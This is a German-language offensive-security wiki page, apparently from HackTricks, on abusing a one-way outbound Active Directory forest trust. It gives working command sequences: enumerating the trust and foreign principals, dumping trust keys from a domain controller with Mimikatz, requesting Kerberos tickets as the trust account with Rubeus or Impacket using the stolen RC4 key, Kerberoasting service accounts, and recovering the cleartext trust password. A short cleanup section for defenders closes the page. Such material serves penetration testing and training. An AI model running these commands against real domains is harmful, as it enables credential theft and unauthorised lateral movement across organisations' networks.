# Externe Forest-Domäne - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

In diesem Szenario **vertraut deine Domäne** bestimmten **Privilegien** für Principals aus einer **anderen Domäne/einem anderen Forest**.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Wenn das AD-Modul verfügbar ist, untersuche auch das **Trusted Domain Object (TDO)** direkt. Dadurch erhältst du die unverarbeiteten, LDAP-basierten Trust-Daten, die du später benötigst, um zu entscheiden, ob der einfache Weg über **FSP/group abuse** oder **trust-account abuse** führt:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Du solltest außerdem auflisten, wo den Foreign Principals aus `CN=ForeignSecurityPrincipals` tatsächlich Zugriff gewährt wurde. Häufige Treffer sind:

- **Local admin** auf einem Server/DC in deiner aktuellen Domain
- Mitgliedschaft in einer **custom domain group**, die ACLs für Benutzer/Computer/GPOs besitzt
- Berechtigungen zum Ändern von **computer objects**, die später zu [RBCD](resource-based-constrained-delegation.md) werden können, wenn die Trust-Konfiguration dies zulässt

## Trust Account Attack

Wenn ein one-way trust von Domain/Forest **B** zu Domain/Forest **A** erstellt wird (**B trusts A**), wird in **A** ein **trust account** für **B** erstellt. Aus Sicht des outbound trust von **A** ist dies nützlich, da du später, falls du **B** (die trusting side) kompromittierst, dort das trust secret dumpen und dich als `B$` zurück bei **A** authentifizieren kannst.<sup>[[1]](#references)</sup>

Der entscheidende Aspekt hierbei ist, dass das Passwort und das Kerberos-Material für diesen trust account mithilfe eines Domain Controllers in der **trusting domain** extrahiert werden können:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Dies funktioniert, weil das im **trusted** Domain erstellte Trust-Konto ein aktiviertes Principal ist, das dort letztendlich über die grundlegenden Berechtigungen eines normalen Domain-Benutzers verfügt. Das reicht häufig aus, um mit der LDAP-Aufzählung zu beginnen, Tickets anzufordern und den nächsten Eskalationspfad zu finden.<sup>[[1]](#references)</sup>

In einem Szenario, in dem `ext.local` die **trusting** Domain und `root.local` die **trusted** Domain ist, wird in `root.local` ein Benutzerkonto namens `EXT$` erstellt. Das Auslesen der Trust-Schlüssel aus `ext.local` liefert Credentials, die als `root.local\EXT$` gegenüber `root.local` verwendet werden können:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Anschließend den extrahierten **RC4**-Schlüssel verwenden, um sich innerhalb von `root.local` als `root.local\EXT$` zu authentifizieren:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Enumeriere anschließend die vertrauenswürdige Domäne als dieser Principal, beispielsweise durch Kerberoasting eines hochwertigen SPN in `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Von Linux

Wenn du den **RC4**-Schlüssel des Trust-Accounts wiederhergestellt hast, funktioniert dieselbe Idee unter Linux mit Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Wenn **RC4** nicht akzeptiert wird, greife auf das wiederhergestellte **Klartextpasswort** (oder abgeleitete **AES**-Schlüssel) zurück und verwende von diesem Foothold aus die üblichen [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md)- und [Kerberoast](kerberoast.md)-Workflows.

### Stolpersteine beim Schlüsselmaterial

Verwechsle nicht **Vertrauensschlüssel** und **Trust-Account-Zugangsdaten**:<sup>[[1]](#references)</sup>

- Bei einem unidirektionalen Trust speichern beide Seiten ein **TDO**, aber das eigentliche **`EXT$`-Benutzerkonto existiert nur in der vertrauten Domain**.
- Das aktuelle Trust-Account-Passwort wird im Trust Secret des TDO (`NewPassword` / aktueller Trust-Schlüssel) widergespiegelt.
- Der **RC4**-Trust-Schlüssel ist das am einfachsten wiederverwendbare Artefakt für `asktgt` als Trust Account; in Standardkonfigurationen ist dies normalerweise der funktionierende Enctype, da für das Trust Account häufig ein leeres `msDS-SupportedEncryptionTypes` gesetzt ist.
- Wenn du in Form von **AES-Trust-Schlüsseln** denkst, beachte, dass diese nicht mit den AES-Schlüsseln des Trust Accounts austauschbar sind, da sich die Salts unterscheiden.

Bevorzuge daher für die Technik auf dieser Seite entweder das ausgelesene **RC4**-Material oder das wiederhergestellte **Klartextpasswort**.<sup>[[1]](#references)</sup>

### Sammeln des Klartextpassworts

Im vorherigen Ablauf wurde anstelle des **Klartextpassworts** der Trust-Hash verwendet (der ebenfalls von **mimikatz ausgelesen** wird).<sup>[[1]](#references)</sup>

Das Klartextpasswort kann ermittelt werden, indem die \[ CLEAR ]-Ausgabe von mimikatz aus dem Hexadezimalformat konvertiert und die Nullbytes `\x00` entfernt werden:<sup>[[1]](#references)</sup>

![Trust Account Attack - Sammeln des Klartextpassworts: Das Klartextpasswort kann ermittelt werden, indem die ( CLEAR )-Ausgabe von mimikatz aus dem Hexadezimalformat konvertiert und alle Null...](<../../images/image (938).png>)

Beim Erstellen einer Trust-Beziehung muss der Benutzer manchmal ein Passwort für den Trust eingeben. In dieser Demonstration ist der Schlüssel das ursprüngliche Trust-Passwort und daher menschenlesbar. Wenn der Schlüssel rotiert wird (Standard: alle 30 Tage), ist der Klartext normalerweise nicht mehr menschenlesbar, aber technisch weiterhin verwendbar.<sup>[[1]](#references)</sup>

Das Klartextpasswort kann verwendet werden, um eine reguläre Authentifizierung als Trust Account durchzuführen, alternativ zum Anfordern eines TGT mit dem Kerberos Secret Key des Trust Accounts. Hier wird `root.local` von `ext.local` aus nach Mitgliedern von `Domain Admins` abgefragt:<sup>[[1]](#references)</sup>

![Trust Account Attack - Sammeln des Klartextpassworts: Das Klartextpasswort kann verwendet werden, um eine reguläre Authentifizierung als Trust Account durchzuführen, alternativ zum Anfordern eines TGT...](<../../images/image (792).png>)

### Praktische Einschränkungen

> [!WARNING]
> Trust Accounts sind ungewöhnliche Principals. Interaktive Logons wie **RUNAS / console / RDP** sind hier nicht der erwartete Weg, und **NTLM**-Authentifizierungsversuche können mit `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` fehlschlagen. Plane stattdessen **Kerberos-Netzwerk-Logons** (`asktgt`, LDAP, CIFS, Kerberoast) ein.<sup>[[1]](#references)</sup>

### Hinweis zu Persistenz/Bereinigung

Wenn die Defender erkennen, dass die vertrauende Domain kompromittiert wurde, sollten sie das Trust Secret auf **beiden Seiten** mit `netdom trust ... /resetOneSide ...` rotieren. Aus Sicht des Operators ist dies relevant, weil ein **manueller Reset das alte Trust-Material sofort ungültig macht**, während bei der normalen Trust-Passwortrotation die aktuellen/vorherigen Werte während des Rollovers erhalten bleiben.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Referenzen

- [1] [SID filter as security boundary between domains? (Part 7) – Trust account attack – from trusting to trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Resetting a trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
